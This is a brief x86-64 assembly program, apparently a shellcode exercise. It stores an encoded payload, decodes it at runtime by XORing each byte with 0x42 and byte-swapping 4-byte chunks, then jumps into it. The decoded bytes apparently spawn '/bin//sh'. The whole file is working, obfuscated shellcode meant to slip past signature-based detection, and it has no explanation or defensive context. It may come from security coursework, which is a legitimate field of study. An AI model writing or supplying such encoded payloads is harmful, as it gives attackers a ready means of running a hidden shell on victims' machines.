section .text

global _start

_start:
	jmp short run
	shellcode : db 0x12,0x82,0x73,0x0a,0x6d,0x6d,0xfc,0x0a,0x6d,0x2c,0x2b,0x20,0x0a,0x14,0x2a,0x31,0x73,0x0a,0xa5,0xcb,0x90,0x73,0x0a,0xb4,0x47,0x4d,0x79,0xf2

run :
	lea rbx,[rel shellcode]
	mov r10,rbx

	xor rcx,rcx
	mov cl,28

xored:
	xor byte[rbx],0x42
	inc rbx
	loop xored

	xor rcx,rcx
	jmp swap

inc:
	inc rcx
	cmp rcx,0x1c
	jge short shellcode

swap:
	mov edi,dword[r10+rcx]
	bswap edi
	mov dword[r10+rcx],edi
	add rcx,4
	loop inc

		




